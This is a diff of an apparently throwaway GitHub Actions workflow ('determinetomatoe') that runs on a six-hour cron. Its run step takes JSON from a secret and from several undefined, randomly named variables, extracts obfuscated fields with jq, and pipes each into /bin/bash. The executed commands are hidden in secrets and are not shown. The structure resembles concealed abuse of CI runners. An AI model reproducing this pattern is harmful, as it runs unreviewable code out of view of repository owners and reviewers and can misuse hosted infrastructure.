@@ -3,19 +3,28 @@ name: determinetomatoe
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
+    - cron: '5 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: determinetomatoe
         env:
-          deodo77: ${{ secrets.deodo77 }}
+          ihxkb29543: ${{ secrets.ihxkb29543 }}
         run: |
-          echo $deodo77 | jq -r .uxpbz0 | /bin/bash
-          echo $ywbo5 | jq -r .va43 | /bin/bash
-          echo $wsr9418 | jq -r .xs81443 | /bin/bash
-          echo $t401 | jq -r .bskfl800 | /bin/bash
-          echo $ip7517 | jq -r .x7 | /bin/bash
+          echo $ihxkb29543 | jq -r .ioyhb5 | /bin/bash
+          echo $twm37494 | jq -r .y4465 | /bin/bash
+          echo $y0704 | jq -r .mkv2962 | /bin/bash
+          echo $thlr15982 | jq -r .o2426 | /bin/bash
+          echo $gd4487 | jq -r .jehqw7 | /bin/bash
+          echo $r5611 | jq -r .lq164 | /bin/bash
+          echo $uwlyj9 | jq -r .ak6 | /bin/bash
+          echo $zuxe724 | jq -r .po59041 | /bin/bash
+          echo $c5949 | jq -r .s72382 | /bin/bash
+          echo $suvj96 | jq -r .sqc1101 | /bin/bash
+          echo $mmnk374 | jq -r .hfo916 | /bin/bash
+          echo $pqykx27 | jq -r .uk1285 | /bin/bash
 
